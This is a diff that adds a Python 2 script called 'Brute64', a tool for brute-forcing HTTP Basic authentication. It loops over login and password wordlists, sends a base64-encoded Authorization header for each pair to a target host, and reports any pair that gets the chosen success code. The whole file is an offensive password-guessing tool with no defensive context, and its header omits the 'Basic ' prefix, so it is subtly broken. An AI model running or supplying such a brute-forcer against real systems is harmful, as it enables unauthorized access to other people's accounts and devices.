@@ -1,0 +1,84 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+
+import urllib2;
+import numpy as np
+import base64
+import sys
+import argparse
+import os;
+
+from datetime import datetime, timedelta
+from time import sleep
+
+# Draw functions
+def drawDivider(columns):
+    for i in range(0,int(columns)): sys.stdout.write('-')
+
+def printByColumn(column,text):
+    for i in range(0,int(column)): sys.stdout.write(' ')
+    print text;
+
+# Basic functions
+def getArrayLinesByFile(file):
+    return np.asarray(file.read().splitlines());
+
+def getResponse(request):
+    try:
+        return urllib2.urlopen(request);
+    except Exception as e:
+        return None;
+
+def getConsoleArgs():
+    parser = argparse.ArgumentParser(prog="Brute64")
+    parser.add_argument('-host',required=False,default="192.168.0.1",help="[Target IP | domain]",metavar="",dest="host")
+    parser.add_argument('-l',required=True,default="logins.txt",help="[Login list]",metavar="",dest="loginList")
+    parser.add_argument('-p',required=True,default="passwords.txt",help="[Password list]",metavar="",dest="passwordList")
+    parser.add_argument('-c',required=False,default="200",help="[Success code. Example: 200]",metavar="",dest="code")
+    parser.add_argument('-s', action='store_false',help="[Silence mode]",dest="smode")
+    parser.add_argument('-delay',required=False,default="0",help="[Delay between requests]",dest="delay",metavar="")
+    return parser.parse_args();
+
+# Init section
+consoleRows, consoleColumns = os.popen('stty size', 'r').read().split()
+data=getConsoleArgs();
+
+drawDivider(consoleColumns);
+printByColumn(int(consoleColumns)/2 - 8,"**** CONFIG ****")
+print "- Host: " + data.host;
+print "- Login list: " + data.loginList;
+print "- Password list: " + data.passwordList;
+print "- Status code: " + data.code;
+print "- Smode: " + str(data.smode);
+print "- Delay: " + data.delay;
+drawDivider(consoleColumns);
+
+# Main work section
+try:
+    logins = getArrayLinesByFile(file(data.loginList,'r'));
+    passwords = getArrayLinesByFile(file(data.passwordList,'r'));
+
+    print "Count logins: {}".format(logins.size);
+    print "Count passwords: {}".format(passwords.size);
+    print "Wait...";
+
+    t1 = datetime.now();
+    for login in logins:
+        for password in passwords:
+            if data.delay != "0": sleep(float(data.delay)); 
+            request = urllib2.Request('http://{}'.format(data.host));
+            request.add_header('Authorization',base64.b64encode("{}:{}".format(login,password)));
+            response = getResponse(request)
+            if response != None:
+                currentCode = str(response.getcode());
+                if currentCode == data.code:
+                    print "Success! Login:{} Password:{}".format(login,password);
+                    exit();
+            else:
+                if data.smode == True:
+                    print "{}:{} DENIED".format(login,password);
+    t2 = datetime.now();
+    print "Sorry, brute failure. Work time: {}s".format(round((t2 - t1).total_seconds(),3))
+except Exception as e:
+    print "Brute failure!"
+    print str("Error: {}".format(e));
